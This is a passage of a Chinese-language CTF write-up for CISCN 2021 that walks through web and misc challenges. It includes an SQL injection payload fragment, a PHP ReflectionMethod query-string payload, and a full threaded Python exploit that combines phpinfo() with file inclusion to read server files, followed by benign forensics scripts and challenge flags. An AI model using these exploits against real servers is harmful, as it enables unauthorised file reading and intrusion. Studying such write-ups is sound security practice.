comment">--+&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>同表查询得到列名id,no,200e6beb-a706-473f-add2-29e877c6ce25</p><p>最终</p><img src="/article/ciscn2021/1.jpg" class="" title="2ED72E0CF8ED07FBCB27F11F73A6187B" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;63zs0-zMP27-bhZDu-kIEv3-AvlHh-&#125;</code></pre><hr><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>扫目录发现<code>.index.php.swo</code></p><p>可以利用 PHP 内置类中的 <code>ReflectionMethod</code> 来读取 <code>User</code> 类里面各个函数的注释</p><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</code></pre><img src="/article/ciscn2021/image-20210515124614970.png" class="" title="image-20210515124614970" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;Ak4Z6-6GU0a-fAz0n-OTdYy-KDq4Q-&#125;</code></pre><hr><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>扫目录发现<code>.listing</code></p><p>访问得到<code>you_can_seeeeeeee_me.php</code>，给了phpinfo</p><p>根据源码发现</p><p><code>$_POST[&quot;field&quot;];</code>和<code>echo $$field;</code>有出入</p><p>根据vulhub一个利用phpinfo进行文件包含的漏洞，改一下exp直接打</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> threading<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>    <span class="token comment"># PAYLOAD = """%s\r</span>    <span class="token comment"># &lt;?php var_dump(scandir('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/'));?>\r""" % TAG</span>    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r&lt;?php var_dump(file_get_contents('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g'));?>\r"""</span> <span class="token operator">%</span> TAG    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="123"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714"""</span> <span class="token operator">%</span> PAYLOAD    padding<span class="token operator">=</span><span class="token string">"G"</span> <span class="token operator">*</span> <span class="token number">5000</span>    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\rCookie: PHPSESSID=1; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\rHTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>    <span class="token comment">#modify this to suit the LFI script  </span>    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\rContent-Type: application/x-www-form-urlencodedContent-Length: %s\r\r%s"""</span>    <span class="token comment">#print(REQ1)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    fn<span class="token operator">=</span><span class="token string">"cf=../../../../../..&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span>    <span class="token comment">#print(fn)</span>    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>        <span class="token keyword">return</span> fncounter<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> counter        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">return</span>                counter<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> x<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"\nGot it!"</span>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        d<span class="token operator">+=</span>i                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment"># detect the final chunk</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    <span class="token comment"># padded up a bit</span>    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    port<span class="token operator">=</span><span class="token number">80</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        poolsz<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>      reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">with</span> l<span class="token punctuation">:</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">print</span>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">":("</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑出结果</p><img src="/article/ciscn2021/image-20210515181707458.png" class="" title="image-20210515181707458" loading="lazy"><img src="/article/ciscn2021/image-20210515182132566.png" class="" title="image-20210515182132566" loading="lazy"><img src="/article/ciscn2021/image-20210515182141809.png" class="" title="image-20210515182141809" loading="lazy"><img src="/article/ciscn2021/image-20210515182239294.png" class="" title="image-20210515182239294" loading="lazy"><img src="/article/ciscn2021/image-20210515182330338.png" class="" title="image-20210515182330338" loading="lazy"><img src="/article/ciscn2021/image-20210515182410646.png" class="" title="image-20210515182410646" loading="lazy"><img src="/article/ciscn2021/image-20210515183203380.png" class="" title="image-20210515183203380" loading="lazy"><p>flag位置：<code>/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g</code></p><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;BmLDI-8WFso-KZGN9-XObp3-sjSOf-&#125;</code></pre><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>流量包分析</p><img src="/article/ciscn2021/9CFC275D-3F65-48C5-A8BE-F9B67DDD610D.png" class="" title="9CFC275D-3F65-48C5-A8BE-F9B67DDD610D" loading="lazy"><p>发现三个关键部分</p><p>全部导出看看，解压<code>flag_wrapper</code>得到<code>CISCN&#123;&#125;</code></p><img src="/article/ciscn2021/image-20210516043809208.png" class="" title="image-20210516043809208" loading="lazy"><p>利用脚本解br发现proto3内容</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> brotli<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./test.br"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content <span class="token operator">=</span> brotli<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"bw"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span></code></pre><img src="/article/ciscn2021/image-20210516052103002.png" class="" title="image-20210516052103002" loading="lazy"><p>导出<code>secret</code>内容如下</p><img src="/article/ciscn2021/image-20210516052229144.png" class="" title="image-20210516052229144" loading="lazy"><p>由此应该是用proto3协议来解密</p><p>根据教程<a href="https://www.cnblogs.com/luoxn28/p/5303517.html">https://www.cnblogs.com/luoxn28/p/5303517.html</a></p><p>安装环境后用其自带的decode方法，用test文件规定的解密规则将处理过的<code>secret</code>进行解密</p><img src="/article/ciscn2021/image-20210516054849721.png" class="" title="image-20210516054849721" loading="lazy"><p>有用的部分在<code>PBResponse</code></p><p>最后拼接flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">15100450</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"e2345"</span><span class="token operator">+</span><span class="token string">"7889b0"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">16453958</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"d172a38dc"</span></code></pre><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;e66a22e23457889b0fb1146d172a38dc&#125;</code></pre><hr><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>下载为gif，Photoshop打开发现有几百帧，仔细观察发现每帧上有奇怪像素点，RGB值为(233,233,233)</p><img src="/article/ciscn2021/image-20210516045206693.png" class="" title="image-20210516045206693" loading="lazy"><p>利用convert进行抽帧</p><pre class="language-bash" data-language="bash"><code class="language-bash">convert ./running_pixel.gif ./output/out%05d.png</code></pre><p>把每张图RGB(233,233,233)像素的坐标提取出来放文档里</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> ospath <span class="token operator">=</span> <span class="token string">"./output/"</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagewidth <span class="token operator">=</span> <span class="token number">400</span>height <span class="token operator">=</span> <span class="token number">400</span><span class="token keyword">def</span> <span class="token function">get_rgb</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>    pixel <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>    coordinates <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    out_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./list.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> g <span class="token punctuation">,</span>b <span class="token operator">=</span> pixel<span class="token punctuation">[</span>x<span class="token punctuation">,</span> y<span class="token punctuation">]</span>            <span class="token keyword">if</span> r <span class="token operator">==</span> g <span class="token operator">==</span> b <span class="token operator">==</span> <span class="token number">233</span><span class="token punctuation">:</span>                coordinate <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span>                out_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>coordinate <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>                <span class="token comment"># print(r, g, b)</span>    <span class="token keyword">return</span> coordinates  <span class="token keyword">def</span> <span class="token function">get_files</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> pic_file <span class="token keyword">in</span> files<span class="token punctuation">:</span>        pic <span class="token operator">=</span> get_files<span class="token punctuation">(</span>pic_file<span class="token punctuation">)</span>        coors <span class="token operator">=</span> get_rgb<span class="token punctuation">(</span>pic<span class="token punctuation">)</span></code></pre><p>得到所有像素点后画图，使用现成脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDrawflag_image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'list.txt'</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>flag_image<span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    point <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag_image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>point<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span 